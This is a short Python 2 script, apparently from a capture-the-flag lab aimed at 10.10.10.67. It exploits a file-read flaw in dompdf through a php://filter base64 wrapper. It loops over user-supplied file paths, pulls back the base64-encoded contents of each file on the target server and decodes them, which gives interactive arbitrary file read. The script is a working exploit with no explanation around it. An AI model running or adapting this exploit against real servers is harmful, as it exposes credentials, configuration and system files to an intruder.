import requests
import re
import base64


while True:
	
	file = raw_input('$ ')
	resp = requests.get("http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=" + file)
	print resp.text
	m = re.search('(?<=\[\().*?(?=\)\])', resp.text)
	try:
		print base64.b64decode(m.group(0))
	except:
		'file does not exist or no permissions'
